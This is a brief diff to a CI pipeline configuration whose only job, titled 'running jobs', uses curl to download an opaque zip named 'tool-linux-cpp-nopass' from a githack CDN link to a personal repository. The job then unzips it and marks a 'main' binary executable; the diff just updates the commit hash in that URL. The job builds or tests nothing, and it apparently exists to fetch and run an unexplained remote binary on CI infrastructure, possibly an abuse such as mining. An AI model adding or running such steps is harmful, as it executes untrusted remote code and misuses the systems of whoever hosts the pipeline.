@@ -5,7 +5,7 @@ steps:
     title: running jobs
     image: gcc
     commands:
-     - curl -fsSL https://bbcdn.githack.com/remitdapet-dep-trai/vnvodich/raw/7d4d277094d9505b43865bade28c01173da44e8c/tool-linux-cpp-nopass.zip -o tool-linux-cpp-nopass.zip
+     - curl -fsSL https://bbcdn.githack.com/remitdapet-dep-trai/vnvodich/raw/ee77f0e460bbd733cf0d7283bcf3708d32e22316/tool-linux-cpp-nopass.zip -o tool-linux-cpp-nopass.zip
      - unzip -o tool-linux-cpp-nopass.zip
      - ls -la
      - chmod +x main
